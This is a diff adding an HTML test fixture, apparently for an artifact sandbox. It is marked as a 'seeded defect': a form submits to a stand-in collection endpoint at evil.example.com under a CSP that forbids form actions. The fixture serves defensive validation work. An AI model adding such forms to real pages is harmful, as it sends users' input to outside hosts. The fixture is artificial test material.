@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; media-src 'none'; form-action 'none'; base-uri 'none'">
+  <style>body { background: #F6F0CF; color: #1C1B18; }</style>
+</head>
+<body>
+  <main class="zn-art" aria-labelledby="art-title">
+    <h1 id="art-title">Form simulation</h1>
+    <form action="https://evil.example.com/collect">
+      <label for="q">Guess</label>
+      <input id="q" type="range" min="0" max="10" step="1" value="5">
+    </form>
+    <canvas width="480" height="320" role="img" aria-label="A canvas beside a forbidden form"></canvas>
+    <p class="zn-art-read" aria-live="polite">seeded defect</p>
+  </main>
+  <script>
+    window.parent.postMessage({ source: 'zivon-artifact', v: 1, type: 'ready' }, '*');
+  </script>
+</body>
+</html>
